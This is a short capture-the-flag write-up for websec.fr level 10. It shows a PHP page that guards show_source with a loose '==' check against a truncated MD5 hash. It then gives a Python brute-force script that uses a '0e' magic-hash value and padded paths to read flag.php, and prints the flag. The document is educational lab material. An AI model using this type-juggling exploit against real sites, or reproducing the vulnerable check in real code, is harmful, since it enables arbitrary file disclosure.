```
<?php
if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
    $file = $_REQUEST['f'];
    $request = $_REQUEST['hash'];

    $hash = substr (md5 ($flag . $file . $flag), 0, 8);

    echo '<div class="row"><br><pre>';
    if ($request == $hash) {
    show_source ($file);
    } else {
    echo 'Permission denied!';
    }
    echo '</pre></div>';
}
?>
```
+ So, we need to bypass the check `if($request==hash)`. 
+ Another thing to notice it is using loose comparison, so now it is easy to bypass
We can use the following script to get the flag:
```
import requests

prefix = "./"
while True:
    r = requests.post("http://websec.fr/level10/index.php", data={
        'hash': "0e12345",
        'f': prefix + 'flag.php'
    })

    if "WEBSEC{" in r.text:
        print(r.text)
        break

    prefix += "/"
```
Flag:WEBSEC{Lose_typ1ng_system_are_super_great_aren't_them?}
